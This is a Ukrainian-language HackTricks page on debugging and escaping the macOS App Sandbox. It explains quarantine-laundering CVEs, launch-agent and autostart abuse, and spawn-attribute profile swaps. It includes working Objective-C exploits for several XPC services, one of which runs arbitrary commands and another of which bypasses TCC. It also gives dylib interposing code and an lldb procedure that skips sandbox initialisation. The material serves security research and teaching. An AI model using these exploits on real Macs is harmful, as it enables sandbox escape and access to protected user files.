# Налагодження та обхід macOS Sandbox

{{#include ../../../../../banners/hacktricks-training.md}}

## Процес завантаження Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Зображення з <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

На попередньому зображенні можна побачити, **як завантажується sandbox**, коли запускається програма з entitlement **`com.apple.security.app-sandbox`**.

Компілятор прив’яже `/usr/lib/libSystem.B.dylib` до бінарного файлу.

Потім **`libSystem.B`** викликає кілька функцій, доки **`xpc_pipe_routine`** не надсилає entitlements програми до **`securityd`**. Securityd перевіряє, чи потрібно ізолювати процес у sandbox, і, якщо так, ізолює його.\
Нарешті, sandbox активується викликом **`__sandbox_ms`**, який викликає **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Можливі способи обходу

### Обхід атрибута quarantine

До **файлів, створених процесами в sandbox**, додається **атрибут quarantine**, щоб запобігти виходу з sandbox: якщо скинути нову програму й спробувати її запустити, прапорець quarantine заблокує її. Отже, **якщо вдасться скинути файл або папку *без* атрибута quarantine, можна вийти з App Sandbox** — просто скиньте пакет `.app` і запустіть його командою `open`, оскільки щойно запущений процес працюватиме під керуванням LaunchServices, а не вашого sandbox.

Надійний спосіб **скинути файл без quarantine** — попросити **інший процес створити його для вас**. Як описує Mickey Jin у статті [**Нова ера обходів macOS Sandbox**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), **App Sandbox** позначає скинуті файли атрибутом quarantine, а **сервіси XPC, що працюють у Service Sandbox, цього не роблять**. Тому кілька неавтентифікованих сервісів XPC можна було використовувати як примітив для «відмивання quarantine»:<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) і **CVE-2023-32414** (`ArchiveService`): розпаковують архів, переданий програмою в sandbox, у вибране місце **без перенесення xattr quarantine на розпакований вміст**.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): обхід каталогів у `submitSignpostDataWithConfig:` давав змогу створювати **довільні каталоги без quarantine** — цього достатньо, щоб створити повну структуру пакета `.app` поза контейнером.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): підключає DMG з quarantine **без встановлення quarantine для пристрою, що з’явився в результаті**, тому програми на підключеному томі можна запускати.

> [!TIP]
> Під час розпакування зазвичай **скидається біт дозволу на виконання**. У CVE-2023-27944 це обходили, розміщуючи **symlink** на наявний підписаний системний бінарний файл (наприклад, `/System/Library/CoreServices/Automator Application Stub`) як головний виконуваний файл пакета. Так його можна запускати без потреби встановлювати `+x` для скинутого файла.

> [!CAUTION]
> Це працює тому, що перевірка залежить від **прапорця елемента, який запускають**: *«Коли програму або інший виконуваний код запускають із Finder чи графічного інтерфейсу, macOS перевіряє його прапорець quarantine перед завантаженням»*, і лише після цього *«передає його Gatekeeper для повних перевірок безпеки під час першого запуску»* ([Пояснення: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Якщо в пакета, який ви запускаєте, немає прапорця, перевірка Gatekeeper не відбудеться — саме такий примітив і забезпечують наведені вище CVE.<sup>[[5]](#references)</sup>
>
> Зауважте, що якщо пакет `.app` уже отримав дозвіл на запуск (він має xattr quarantine із прапорцем «дозволено запуск»), його також можна використати... але тепер ви не зможете записувати всередину пакетів **`.app`**, якщо не маєте привілейованих дозволів TCC (яких у sandbox у вас не буде).

### Зловживання функцією Open

У [**останніх прикладах обходу Word sandbox**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) показано, як можна зловживати функцією CLI **`open`**, щоб обійти sandbox.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Навіть якщо програма **має працювати в sandbox** (`com.apple.security.app-sandbox`), sandbox можна обійти, якщо **запустити її через LaunchAgent** (наприклад, `~/Library/LaunchAgents`).\
Як пояснюється [**в цій публікації**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), щоб забезпечити persistence для програми в sandbox, можна налаштувати її автоматичний запуск як LaunchAgent і, можливо, ін’єктувати шкідливий код через змінні середовища DyLib.<sup>[[6]](#references)</sup>

### Зловживання місцями автозапуску

Якщо процес у sandbox може **записувати** в місце, звідки **пізніше несандбоксована програма запустить бінарний файл**, він зможе **вийти з sandbox, просто розмістивши там** бінарний файл. Прикладами таких місць є `~/Library/LaunchAgents` або `/System/Library/LaunchDaemons`.

Для цього може знадобитися навіть **2 кроки**: змусити процес із **менш обмежувальним sandbox** (`file-read*`, `file-write*`) виконати ваш код, який запише файл у місце, звідки його **запустять без sandbox**.

Перегляньте цю сторінку про **місця автозапуску**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Зловживання іншими процесами

Якщо з процесу в sandbox вам вдасться **скомпрометувати інші процеси**, що працюють у менш обмежувальних sandbox (або взагалі без них), ви зможете вийти з їхніх sandbox:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Доступні системні та користувацькі Mach-сервіси

Sandbox також дозволяє взаємодіяти з певними **Mach-сервісами** через XPC, визначені в профілі `application.sb`. Якщо вдасться **зловживати** одним із цих сервісів, можна буде **вийти з sandbox**.

Як зазначено в [цьому writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), інформація про Mach-сервіси зберігається в `/System/Library/xpc/launchd.plist`. Усі системні та користувацькі Mach-сервіси можна знайти, виконавши пошук у цьому файлі за рядками `<string>System</string>` і `<string>User</string>`.<sup>[[4]](#references)</sup>

Крім того, можна перевірити, чи доступний Mach-сервіс програмі в sandbox, викликавши `bootstrap_look_up`:

```objectivec
void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary<NSString*, id>* job = launchDaemons[key];
      NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
```

### Доступні PID Mach services

Ці Mach services вперше використали для [виходу із sandbox у цьому описі](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). На той час **усі XPC services, потрібні** застосунку та його framework, були видимі в PID domain застосунку (це Mach Services, у яких `ServiceType` має значення `Application`).<sup>[[4]](#references)</sup>

Щоб **зв’язатися з XPC service у PID Domain**, достатньо зареєструвати його в застосунку за допомогою рядка на зразок:

```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```

Крім того, можна знайти всі Mach-сервіси **Application**, виконавши пошук `<string>Application</string>` у `System/Library/xpc/launchd.plist`.

Ще один спосіб знайти дійсні xpc-сервіси — перевірити сервіси в:

```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```

Кілька прикладів зловживання цією технікою наведено в [**оригінальному описі**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), однак нижче наведено кілька стислих прикладів.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Цей сервіс дозволяє всі XPC-з’єднання, завжди повертаючи `YES`, а метод `runTask:arguments:withReply:` виконує довільну команду з довільними параметрами.

Exploit був «таким простим»:

```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@"run task result:%@, error:%@", bSucc, error);
    }];
}
```

#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Цей XPC service дозволяв усіх клієнтів, завжди повертаючи `YES`, а метод `createZipAtPath:hourThreshold:withReply:` приймав шлях до папки та стискав її у ZIP-файл.

Отже, можна створити фальшиву структуру папок застосунку, стиснути її, а потім розпакувати й виконати, щоб вийти з sandbox, оскільки нові файли не матимуть атрибута quarantine.

Експлойт виглядав так:

```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@"======== preparing payload at the current path:%@", currentPath);
    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @"zip"]) {
                // open the zip
                NSString *cmd = [@"open " stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
```

#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Цей XPC-сервіс надає XPC-клієнту доступ на читання й запис до довільної URL-адреси через метод `extendAccessToURL:completion:`, який приймав будь-яке з’єднання. Оскільки XPC-сервіс має FDA, цими дозволами можна зловживати, щоб повністю обійти TCC.

Експлойт полягав у такому:

```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
        else {
            NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
```

### Статична компіляція та динамічне компонування

[**Це дослідження**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) виявило 2 способи обійти Sandbox. Оскільки Sandbox застосовується з userland під час завантаження бібліотеки **libSystem**, бінарний файл, який міг би уникнути її завантаження, ніколи б не потрапив під дію Sandbox:<sup>[[2]](#references)</sup>

- Якби бінарний файл було **повністю статично скомпільовано**, він міг би уникнути завантаження цієї бібліотеки.
- Якби **бінарному файлу не потрібно було завантажувати жодних бібліотек** (оскільки компонувальник також міститься в libSystem), йому не потрібно було б завантажувати libSystem.

### Shellcodes

Зауважте, що **навіть shellcodes** в ARM64 потрібно компонувати з `libSystem.dylib`:

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### Обмеження, що не успадковуються

Як пояснено в **[бонусі цього writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, обмеження sandbox на кшталт:<sup>[[4]](#references)</sup>

```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```

можна обійти, запустивши новий процес, наприклад:

```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```

Однак, звісно, цей новий процес не успадкує entitlements чи привілеї батьківського процесу.

### Заміна успадкованої sandbox за допомогою атрибутів spawn (старіші версії macOS)

Звичайний дочірній процес `posix_spawn()` успадковує sandbox батьківського процесу. У збірках macOS до виправлення від лютого 2026 року процес із sandbox міг натомість передати **вбудовану назву профілю** політиці MAC `Sandbox` через `posix_spawnattr_setmacpolicyinfo_np()`. Дочірній процес отримував цей профіль *замість* обмежень батьківського процесу. Вбудований профіль `no-network` усе ще дозволяв доступ до домашньої директорії користувача, тож дочірній процес, наприклад `/bin/bash`, міг працювати з файлами, до яких батьківський процес App Sandbox не мав доступу. Це відрізняється від [маршруту LaunchServices `open`](#not-inherited-restrictions), де процес запускає окрема служба. Загальний шлях передавання даних описано в розділі [Атрибути spawn, специфічні для політик MACF](../../macos-macf-mandatory-access-control-framework.md#policy-specific-spawn-attributes-as-a-macf-input).<sup>[[7]](#references)</sup>

Щоб перевірити цю межу на **ізольованому вразливому хості macOS**, створіть нешкідливий canary у домашній директорії поза контейнером програми. Запустіть той самий дочірній процес з уже обмеженого sandbox батьківського процесу спочатку за допомогою звичайного `posix_spawn()`, а потім із blob атрибутів spawn для Sandbox, що вибирає `no-network`; порівняйте, чи може дочірній процес прочитати canary. Наведений нижче фрагмент використовує приватне визначення `sandbox_spawnattr_t` і оголошення функцій із [прикладу launcher](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec) від Siguza. Під час інтеграції в тестову програму додайте стандартну обробку помилок.<sup>[[7]](#references)[[8]](#references)</sup>

```c
sandbox_spawnattr_t sb;
posix_spawnattr_t attr;
pid_t pid;
char *argv[] = {"/bin/bash", "-c", "cat \"$HOME/sandbox-canary.txt\"", NULL};
sandbox_spawnattrs_init(&sb);
sandbox_spawnattrs_setprofilename(&sb, "no-network");
posix_spawnattr_init(&attr);
posix_spawnattr_setmacpolicyinfo_np(&attr, "Sandbox", &sb, sizeof(sb));
int err = posix_spawn(&pid, "/bin/bash", NULL, &attr, argv, environ);
if (!err) waitpid(pid, NULL, 0);
```

Успішне повернення `posix_spawn()` не є доказом виходу з sandbox: перевірте **ефективний доступ дочірнього процесу до файлів** і порівняйте його зі звичайним базовим рівнем для дочірнього процесу. Виправлені системи відхиляють запит на вбудований профіль від процесу, який уже працює в sandbox, якщо він не має приватного entitlement `com.apple.private.security.sandbox-spawnattrs`. Не вважайте цю історичну поведінку актуальним способом обходу.<sup>[[7]](#references)</sup>

### Entitlements

Зверніть увагу, що деякі **дії** можуть бути **дозволені sandbox**, якщо програма має певний **entitlement**, як-от:

```scheme
(when (entitlement "com.apple.security.network.client")
      (allow network-outbound (remote ip))
      (allow mach-lookup
             (global-name "com.apple.airportd")
             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
             (global-name "com.apple.cfnetwork.cfnetworkagent")
             [...]
```

### Interposting Bypass

Щоб дізнатися більше про **Interposting**, перегляньте:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer`, щоб запобігти sandbox-у

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
    printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
	void (*overriden__libsecinit_initializer)(void);
	void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Перехопити __mac_syscall, щоб запобігти Sandbox

```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
        printf("Bypassing Sandbox initiation.\n");
        return 0; // pretend we did the job without actually calling __mac_syscall
    }
    // Call the original function for other cases
    return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
    const void *replacement;
    const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### Налагодження та bypass Sandbox за допомогою lldb

Скомпілюймо застосунок, який має працювати в Sandbox:

{{#tabs}}
{{#tab name="sand.c"}}

```c
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
```

{{#endtab}}

{{#tab name="entitlements.xml"}}

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="Info.plist"}}

```xml
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
```

{{#endtab}}
{{#endtabs}}

Потім скомпілюйте застосунок:

```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```

> [!CAUTION]
> Застосунок спробує **прочитати** файл **`~/Desktop/del.txt`**, чого **Sandbox не дозволить**.\
> Створіть там файл, оскільки після обходу Sandbox застосунок зможе його прочитати:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Налагодьмо застосунок, щоб побачити, коли завантажується Sandbox:

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
  x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
    0x187659904 <+4>:  svc    #0x80
    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
    0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

> [!WARNING] > **Навіть після обходу Sandbox TCC** запитає користувача, чи дозволити процесу читати файли з робочого стола

## References

- [1] [Jonathan Levin — Пісочниця Apple: глибше в трясовині (слайди HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha — Обхід Sandbox Mac App Store](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin — Пісочниця Apple: глибше в трясовині (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin — Нова ера обходів Sandbox у macOS](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company — Пояснення: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety — CVE-2023-26818 (Sandbox): обхід macOS TCC через Telegram за допомогою DyLib Injection (частина 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
- [7] [Вихід із Sandbox Apple шляхом запуску виконуваного файла](https://wts.dev/posts/sandbox-spawnattrs-escape/)
- [8] [Siguza — sandbox-exec, але для вбудованих профілів](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec)
{{#include ../../../../../banners/hacktricks-training.md}}
